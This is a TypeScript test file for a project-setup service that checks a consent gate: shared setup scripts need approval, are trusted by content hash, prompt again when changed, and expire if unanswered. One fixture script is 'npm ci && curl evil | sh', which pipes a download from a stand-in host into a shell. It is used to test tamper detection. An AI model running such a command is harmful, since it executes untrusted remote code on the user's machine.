import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { promises as fs } from 'fs'
import os from 'os'
import path from 'path'
import { initPlatform, resetPlatformForTests } from './platform'
import { fakePlatform, type FakePlatform } from './platform-fake'
import { ProjectTrustStore, localTrustKey, sshTrustKey, hashTrustContent } from './project-trust-store'
import {
  projectTrustContent,
  type ProjectSettingsDoc,
  type ProjectSettingsFileV1,
  type ProjectSettingsSnapshot,
  type ProjectLocalSettings,
  type ProjectSetupConsentRequest,
  type ProjectSetupEvent
} from '../shared/project-settings'
import { IPC } from '../shared/ipc'
import {
  ProjectSetupService,
  setupRunKey,
  type ProjectSetupRunner,
  type ProjectSetupTarget
} from './project-setup-service'
import { registerProjectSetupHandlers } from './project-setup-handlers'

let userData: string
let plat: FakePlatform

beforeEach(async () => {
  userData = await fs.mkdtemp(path.join(os.tmpdir(), 'nt-setup-svc-'))
  plat = fakePlatform({ userDataDir: userData })
  initPlatform(plat)
})
afterEach(async () => {
  vi.useRealTimers()
  resetPlatformForTests()
  await fs.rm(userData, { recursive: true, force: true })
})

const target = (over: Partial<ProjectSetupTarget> = {}): ProjectSetupTarget => ({
  projectId: 'p1',
  projectName: 'App',
  rootPath: '/proj/app',
  ...over
})

const sharedFile = (doc: ProjectSettingsDoc): ProjectSettingsFileV1 => ({
  version: 1,
  rev: 1,
  savedAt: '2026-08-19T00:00:00.000Z',
  ...doc
})

const snapshot = (
  shared: ProjectSettingsFileV1 | null,
  local?: ProjectLocalSettings
): ProjectSettingsSnapshot => ({ shared, local })

const consentRequests = (): ProjectSetupConsentRequest[] =>
  plat.sent
    .filter((s) => s.channel === IPC.projectSetupConsentRequest)
    .map((s) => s.args[0] as ProjectSetupConsentRequest)

const dismissed = (): string[] =>
  plat.sent
    .filter((s) => s.channel === IPC.projectSetupConsentDismiss)
    .map((s) => (s.args[0] as { requestId: string }).requestId)

const events = (projectId = 'p1'): ProjectSetupEvent[] =>
  plat.sent
    .filter((s) => s.channel === IPC.projectSetupEvent(projectId))
    .map((s) => s.args[0] as ProjectSetupEvent)

interface RunnerRecorder {
  calls: Array<{ script: string; cwd: string; env: Record<string, string> }>
  runner: ProjectSetupRunner
}
const recorder = (exitCode = 0): RunnerRecorder => {
  const calls: RunnerRecorder['calls'] = []
  const runner: ProjectSetupRunner = async ({ script, cwd, env, onChunk }) => {
    calls.push({ script, cwd, env })
    onChunk('building\n')
    return { exitCode }
  }
  return { calls, runner }
}

describe('setupRunKey', () => {
  it('is a location+kind identity, not a project id', () => {
    const a = setupRunKey(target({ projectId: 'a' }), 'setup')
    const b = setupRunKey(target({ projectId: 'b' }), 'setup')
    expect(a).toBe(b)
    expect(setupRunKey(target(), 'archive')).not.toBe(a)
    expect(setupRunKey(target({ rootPath: '/other' }), 'setup')).not.toBe(a)
    expect(
      setupRunKey(target({ ssh: { server: { host: 'h', user: 'u' }, remoteCwd: '/proj/app' } }), 'setup')
    ).not.toBe(a)
  })
})

describe('ProjectSetupService — local-sourced scripts', () => {
  it('runs a local-sourced script without any consent prompt', async () => {
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'echo hi', waitForSetup: true } }),
      runLocal: runner
    })
    const res = await svc.run(target(), 'setup')
    expect(res).toEqual({ status: 'started', runKey: setupRunKey(target(), 'setup'), waitForSetup: true })
    expect(consentRequests()).toEqual([])

    await vi.waitFor(() => expect(events().some((e) => e.state === 'done')).toBe(true))
    expect(calls).toHaveLength(1)
    expect(calls[0].script).toBe('echo hi')
    expect(calls[0].cwd).toBe('/proj/app')
    expect(calls[0].env).toEqual({
      NODETERM_ROOT_PATH: '/proj/app',
      NODETERM_WORKTREE_PATH: '/proj/app',
      NODETERM_PROJECT_NAME: 'App'
    })
    const seen = events()
    expect(seen[0].state).toBe('running')
    expect(seen.map((e) => e.seq)).toEqual(seen.map((_, i) => i + 1))
    expect(seen.some((e) => e.chunk === 'building\n')).toBe(true)
    const done = seen[seen.length - 1]
    expect(done).toMatchObject({ state: 'done', exitCode: 0, kind: 'setup' })
  })

  it('spawns in the worktree dir and reports a non-zero exit as failed', async () => {
    const { calls, runner } = recorder(3)
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'false' } }),
      runLocal: runner
    })
    const t = target({ worktreePath: '/proj/app-wt' })
    expect(await svc.run(t, 'setup')).toMatchObject({ status: 'started', waitForSetup: false })
    await vi.waitFor(() => expect(events().some((e) => e.state === 'failed')).toBe(true))
    expect(calls[0].cwd).toBe('/proj/app-wt')
    expect(calls[0].env.NODETERM_WORKTREE_PATH).toBe('/proj/app-wt')
    expect(calls[0].env.NODETERM_ROOT_PATH).toBe('/proj/app')
    expect(events().at(-1)).toMatchObject({ state: 'failed', exitCode: 3 })
  })
})

describe('ProjectSetupService — consent gate', () => {
  it('prompts once for a shared-sourced script; approve records the hash and runs', async () => {
    const trust = new ProjectTrustStore()
    const doc: ProjectSettingsDoc = { setup: { setupScript: 'npm ci', archiveScript: 'rm -rf node_modules' } }
    // The whole family is approved by one answer: setup+archive are hashed together.
    const hash = hashTrustContent(projectTrustContent('setup', doc)!)
    const calls: Array<{ script: string }> = []
    const trustedAtSpawn: boolean[] = []
    const runner: ProjectSetupRunner = async ({ script }) => {
      calls.push({ script })
      // The approval is persisted BEFORE anything runs — never "run first, record after".
      trustedAtSpawn.push(await trust.isTrusted(localTrustKey('/proj/app'), 'setup', hash))
      return { exitCode: 0 }
    }
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile(doc)),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    const req = consentRequests()[0]
    expect(req).toMatchObject({
      kind: 'setup',
      projectName: 'App',
      // The dialog is handed the WHOLE family, because that is what one answer approves.
      scripts: { setup: 'npm ci', archive: 'rm -rf node_modules' },
      previouslyApproved: false
    })
    expect(req.locationLabel).toContain('/proj/app')
    expect(calls).toHaveLength(0)

    svc.submitConsent(req.requestId, 'approve')
    expect(await pending).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(events().some((e) => e.state === 'done')).toBe(true))
    expect(calls).toHaveLength(1)
    expect(trustedAtSpawn).toEqual([true])
    expect(await trust.isTrusted(localTrustKey('/proj/app'), 'setup', hash)).toBe(true)

    // Second run of the same, still-trusted family: no second prompt.
    expect(await svc.run(target(), 'archive')).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(calls).toHaveLength(2))
    expect(calls[1].script).toBe('rm -rf node_modules')
    expect(consentRequests()).toHaveLength(1)
  })

  it('hashes and shows the SHARED family only — a local override never enters the trust content', async () => {
    const trust = new ProjectTrustStore()
    const { calls, runner } = recorder()
    // The two documents disagree about the family's OTHER script. The merged/effective doc would
    // hash `local-archive`; only the shared doc may be approved.
    const shared: ProjectSettingsDoc = { setup: { setupScript: 'npm ci', archiveScript: 'shared-archive' } }
    const merged: ProjectSettingsDoc = { setup: { setupScript: 'npm ci', archiveScript: 'local-archive' } }
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile(shared), { setup: { archiveScript: 'local-archive' } }),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    expect(consentRequests()[0].scripts).toEqual({ setup: 'npm ci', archive: 'shared-archive' })
    svc.submitConsent(consentRequests()[0].requestId, 'approve')
    expect(await pending).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(calls).toHaveLength(1))

    const key = localTrustKey('/proj/app')
    const record = await trust.getRecord(key, 'setup')
    expect(record?.contentHash).toBe(hashTrustContent(projectTrustContent('setup', shared)!))
    expect(record?.contentHash).not.toBe(hashTrustContent(projectTrustContent('setup', merged)!))
  })

  it('a local override of a shared script is local-sourced: it runs promptless', async () => {
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () =>
        snapshot(sharedFile({ setup: { setupScript: 'npm ci' } }), { setup: { setupScript: 'my own setup' } }),
      runLocal: runner
    })
    expect(await svc.run(target(), 'setup')).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(calls).toHaveLength(1))
    expect(calls[0].script).toBe('my own setup')
    expect(consentRequests()).toEqual([])
  })

  it('cancel while the dialog is open dismisses it, and a late approve cannot revive the run', async () => {
    const trust = new ProjectTrustStore()
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci' } })),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    const { requestId } = consentRequests()[0]

    expect(svc.cancel(setupRunKey(target(), 'setup'))).toBe(true)
    expect(dismissed()).toEqual([requestId])
    expect(await pending).toEqual({ status: 'skipped', reason: 'declined' })

    svc.submitConsent(requestId, 'approve')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    expect(calls).toHaveLength(0)
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'setup')).toBeNull()
    expect(events()).toEqual([])
    // The queue is free again: the next project still gets its dialog.
    const next = svc.run(target({ projectId: 'p2', rootPath: '/b' }), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(2))
    svc.submitConsent(consentRequests()[1].requestId, 'skip')
    await next
  })

  it('skip does not run and does not record', async () => {
    const trust = new ProjectTrustStore()
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci' } })),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    svc.submitConsent(consentRequests()[0].requestId, 'skip')
    expect(await pending).toEqual({ status: 'skipped', reason: 'declined' })
    expect(calls).toHaveLength(0)
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'setup')).toBeNull()
    expect(events()).toEqual([])
  })

  it('an unanswered prompt expires after 300s: dismissed, not run, not recorded', async () => {
    // `shouldAdvanceTime` so the store's real fs reads still make progress while the clock is fake.
    vi.useFakeTimers({ shouldAdvanceTime: true })
    const trust = new ProjectTrustStore()
    const { calls, runner } = recorder()
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci' } })),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    const { requestId } = consentRequests()[0]

    await vi.advanceTimersByTimeAsync(299_000)
    expect(dismissed()).toEqual([])
    await vi.advanceTimersByTimeAsync(2_000)
    expect(await pending).toEqual({ status: 'skipped', reason: 'unanswered' })
    expect(dismissed()).toEqual([requestId])
    expect(calls).toHaveLength(0)
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'setup')).toBeNull()

    // A late answer for an expired prompt is a no-op, never a retroactive approval.
    svc.submitConsent(requestId, 'approve')
    await vi.advanceTimersByTimeAsync(0)
    expect(calls).toHaveLength(0)
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'setup')).toBeNull()
  })

  it('re-prompts with previouslyApproved=true when the approved content changed', async () => {
    const trust = new ProjectTrustStore()
    const { runner } = recorder()
    const oldHash = hashTrustContent(projectTrustContent('setup', { setup: { setupScript: 'npm ci' } })!)
    await trust.record(localTrustKey('/proj/app'), 'setup', oldHash, '2026-08-01T00:00:00.000Z')
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci && curl evil | sh' } })),
      runLocal: runner
    })
    const pending = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    expect(consentRequests()[0].previouslyApproved).toBe(true)
    svc.submitConsent(consentRequests()[0].requestId, 'skip')
    await pending
  })

  it('serializes prompts: the second waits for the first to be answered', async () => {
    const trust = new ProjectTrustStore()
    const { runner } = recorder()
    const svc = new ProjectSetupService({
      trust,
      readSettings: async (projectId) =>
        snapshot(sharedFile({ setup: { setupScript: `build ${projectId}` } })),
      runLocal: runner
    })
    const first = svc.run(target({ projectId: 'p1', rootPath: '/a' }), 'setup')
    const second = svc.run(target({ projectId: 'p2', rootPath: '/b' }), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    // Give the second run every chance to jump the queue.
    await Promise.resolve()
    await Promise.resolve()
    expect(consentRequests()).toHaveLength(1)

    svc.submitConsent(consentRequests()[0].requestId, 'skip')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(2))
    svc.submitConsent(consentRequests()[1].requestId, 'skip')
    expect(await first).toEqual({ status: 'skipped', reason: 'declined' })
    expect(await second).toEqual({ status: 'skipped', reason: 'declined' })
    // Both were asked — one after the other, never both at once (the queue order itself is not
    // part of the contract).
    expect(consentRequests().map((r) => r.scripts.setup).sort()).toEqual(['build p1', 'build p2'])
  })

  it('gates an ssh target on its ssh location key', async () => {
    const trust = new ProjectTrustStore()
    const calls: Array<ProjectSetupTarget['ssh']> = []
    const runSsh: ProjectSetupRunner = async ({ ssh }) => {
      calls.push(ssh)
      return { exitCode: 0 }
    }
    const ssh = { server: { host: 'h', user: 'u' }, remoteCwd: '/srv/app' }
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile({ setup: { setupScript: 'npm ci' } })),
      runSsh
    })
    const pending = svc.run(target({ ssh }), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    expect(consentRequests()[0].locationLabel).toBe('u@h:/srv/app')
    svc.submitConsent(consentRequests()[0].requestId, 'approve')
    expect(await pending).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(calls).toHaveLength(1))
    const hash = hashTrustContent(projectTrustContent('setup', { setup: { setupScript: 'npm ci' } })!)
    expect(await trust.isTrusted(sshTrustKey(ssh), 'setup', hash)).toBe(true)
    expect(await trust.isTrusted(localTrustKey('/proj/app'), 'setup', hash)).toBe(false)
  })
})

describe('ProjectSetupService — single-flight, cancel and absent scripts', () => {
  it('a second run for the same target while one is live is busy', async () => {
    let release: (() => void) | undefined
    const gate = new Promise<void>((r) => {
      release = r
    })
    let started = 0
    const runner: ProjectSetupRunner = async () => {
      started++
      await gate
      return { exitCode: 0 }
    }
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'sleep 1' } }),
      runLocal: runner
    })
    expect(await svc.run(target(), 'setup')).toMatchObject({ status: 'started' })
    await vi.waitFor(() => expect(started).toBe(1))
    expect(await svc.run(target(), 'setup')).toEqual({ status: 'skipped', reason: 'busy' })
    expect(started).toBe(1)

    release!()
    await vi.waitFor(() => expect(events().some((e) => e.state === 'done')).toBe(true))
    // Freed once it finished.
    expect(await svc.run(target(), 'setup')).toMatchObject({ status: 'started' })
    release!()
  })

  it('cancel aborts a live run and reports cancelled; an unknown runKey is false', async () => {
    const runner: ProjectSetupRunner = ({ signal }) =>
      new Promise((resolve) => {
        signal.addEventListener('abort', () => resolve({ exitCode: 130 }))
      })
    const svc = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'sleep 100' } }),
      runLocal: runner
    })
    const res = await svc.run(target(), 'setup')
    expect(res.status).toBe('started')
    const runKey = (res as { runKey: string }).runKey
    expect(svc.cancel('nope')).toBe(false)
    expect(svc.cancel(runKey)).toBe(true)
    await vi.waitFor(() => expect(events().at(-1)?.state).toBe('cancelled'))
  })

  it('no script → no-script; ssh target without an ssh runner → unavailable', async () => {
    const { runner } = recorder()
    const empty = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, {}),
      runLocal: runner
    })
    expect(await empty.run(target(), 'setup')).toEqual({ status: 'skipped', reason: 'no-script' })

    const unknownProject = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => null,
      runLocal: runner
    })
    expect(await unknownProject.run(target(), 'setup')).toEqual({ status: 'skipped', reason: 'no-script' })

    // A setup script is not an archive script.
    const setupOnly = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'echo hi' } }),
      runLocal: runner
    })
    expect(await setupOnly.run(target(), 'archive')).toEqual({ status: 'skipped', reason: 'no-script' })

    const noSshRunner = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'echo hi' } }),
      runLocal: runner
    })
    expect(
      await noSshRunner.run(target({ ssh: { server: { host: 'h', user: 'u' }, remoteCwd: '/srv/app' } }), 'setup')
    ).toEqual({ status: 'skipped', reason: 'unavailable' })
  })
})

describe('registerProjectSetupHandlers', () => {
  const stub = () => {
    const runs: Array<[ProjectSetupTarget, string]> = []
    const cancels: string[] = []
    const consents: Array<[string, string]> = []
    const service = {
      run: async (t: ProjectSetupTarget, kind: 'setup' | 'archive') => {
        runs.push([t, kind])
        return { status: 'started', runKey: 'k', waitForSetup: false } as const
      },
      cancel: (runKey: string) => {
        cancels.push(runKey)
        return true
      },
      submitConsent: (requestId: string, answer: 'approve' | 'skip') => {
        consents.push([requestId, answer])
      }
    }
    registerProjectSetupHandlers(plat, service)
    return { runs, cancels, consents }
  }

  it('registers the whole surface, including the accepted subscribe no-ops', () => {
    stub()
    expect(Object.keys(plat.handlers)).toEqual(
      expect.arrayContaining([IPC.projectSetupRun, IPC.projectSetupCancel])
    )
    expect(Object.keys(plat.listeners)).toEqual(
      expect.arrayContaining([
        IPC.projectSetupConsentSubmit,
        IPC.projectSetupSubscribe,
        IPC.projectSetupUnsubscribe
      ])
    )
    expect(() => plat.listeners[IPC.projectSetupSubscribe]('p1')).not.toThrow()
    expect(() => plat.listeners[IPC.projectSetupUnsubscribe]('p1')).not.toThrow()
  })

  it('passes a well-formed target through and answers a malformed one instead of throwing', async () => {
    const { runs } = stub()
    const call = plat.handlers[IPC.projectSetupRun]
    const ssh = { server: { host: 'h', user: 'u', port: 2222 }, remoteCwd: '/srv/app' }
    expect(await call({ ...target(), worktreePath: '/wt', ssh, bogus: 'x' }, 'archive')).toMatchObject({
      status: 'started'
    })
    expect(runs[0][1]).toBe('archive')
    expect(runs[0][0]).toEqual({ ...target(), worktreePath: '/wt', ssh })

    for (const bad of [null, {}, { projectId: 'p', projectName: 'n' }, 'nope']) {
      expect(await call(bad, 'setup')).toEqual({ status: 'skipped', reason: 'unavailable' })
    }
    expect(await call(target(), 'launch')).toEqual({ status: 'skipped', reason: 'unavailable' })
    expect(runs).toHaveLength(1)
  })

  it('rejects a malformed ssh target instead of stripping it down to a LOCAL run', async () => {
    const { runs } = stub()
    const call = plat.handlers[IPC.projectSetupRun]
    const bad = [
      'garbage',
      7,
      { server: { host: 'h' } },
      { server: { host: 'h', user: 'u' } }, // no remoteCwd
      { server: { host: 'h', user: 'u', port: '22' }, remoteCwd: '/srv' },
      { server: { host: 'h', user: 'u', identityFile: 3 }, remoteCwd: '/srv' },
      { server: 'h@u', remoteCwd: '/srv' }
    ]
    for (const ssh of bad) {
      expect(await call({ ...target(), ssh }, 'setup')).toEqual({ status: 'skipped', reason: 'unavailable' })
    }
    expect(runs).toHaveLength(0)
  })

  it('end to end: a malformed ssh target never reaches the local runner', async () => {
    const { calls, runner } = recorder()
    const service = new ProjectSetupService({
      trust: new ProjectTrustStore(),
      readSettings: async () => snapshot(null, { setup: { setupScript: 'echo hi' } }),
      runLocal: runner
    })
    registerProjectSetupHandlers(plat, service)
    const call = plat.handlers[IPC.projectSetupRun]
    expect(await call({ ...target(), ssh: 'garbage' }, 'setup')).toEqual({
      status: 'skipped',
      reason: 'unavailable'
    })
    expect(await call({ ...target(), ssh: { server: { host: 'h' } } }, 'setup')).toEqual({
      status: 'skipped',
      reason: 'unavailable'
    })
    expect(calls).toHaveLength(0)
  })

  it('cancel and consent-submit reject junk arguments', async () => {
    const { cancels, consents } = stub()
    expect(await plat.handlers[IPC.projectSetupCancel]('k1')).toBe(true)
    expect(await plat.handlers[IPC.projectSetupCancel](7)).toBe(false)
    expect(cancels).toEqual(['k1'])

    plat.listeners[IPC.projectSetupConsentSubmit]('r1', 'approve')
    plat.listeners[IPC.projectSetupConsentSubmit]('r2', 'yes')
    plat.listeners[IPC.projectSetupConsentSubmit](5, 'approve')
    expect(consents).toEqual([['r1', 'approve']])
  })
})
